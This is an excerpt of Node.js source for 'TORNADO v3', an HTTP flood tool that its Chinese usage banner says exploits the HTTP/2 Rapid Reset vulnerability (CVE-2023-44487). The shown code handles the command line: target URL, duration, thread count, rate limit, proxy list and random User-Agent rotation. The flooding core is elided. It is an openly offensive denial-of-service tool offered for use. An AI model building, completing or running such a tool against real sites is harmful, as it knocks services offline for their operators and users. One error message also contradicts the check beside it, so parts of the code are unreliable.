...
const UAfileindex = process.argv.indexOf('--useuatxt');
const UAfile = UAfileindex !== -1 && UAfileindex + 1 < process.argv.length ? process.argv[UAfileindex + 1] : undefined;

function readUAfile(filePath) {
    try {
        if (!filePath) return [];
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line);
    } catch (err) {
        console.warn("Warning: Failed to read User-Agent file. Using default User-Agent.");
        return [];
    }
}
function getRandomUA(UA) {
    return UA[Math.floor(Math.random() * UA.length)];
}
var UA = readUAfile(UAfile);
...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    ...
    console.error(`
*****************************************************
    TORNADO v3 方法说明 (利用 RST STREAM 漏洞 CVE-2023-44487) 感谢原作者，此版本由'潇洒哥(水杯)'改版
    使用方法:
...
if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
    console.error('错误请求方法 请求方法只能是 GET/POST/HEAD/OPTIONS');
    process.exit(1);
}

if (customUA && UAfile) {
    console.error('错误UA 不能同时使用 自定义UserAgent 和 自定义UA文件');
    process.exit(1);
}

if (!target.startsWith('https://') && !target.startsWith('http://')) {
    console.error('错误协议 只能是 https:// 或 http://');
    process.exit(1);
}

if (isNaN(time) || time <= 0) {
    console.error('错误时间 不能大于 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('错误线程 不能大于 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`错误速率 不能大于 90`)
    process.exit(1);
}
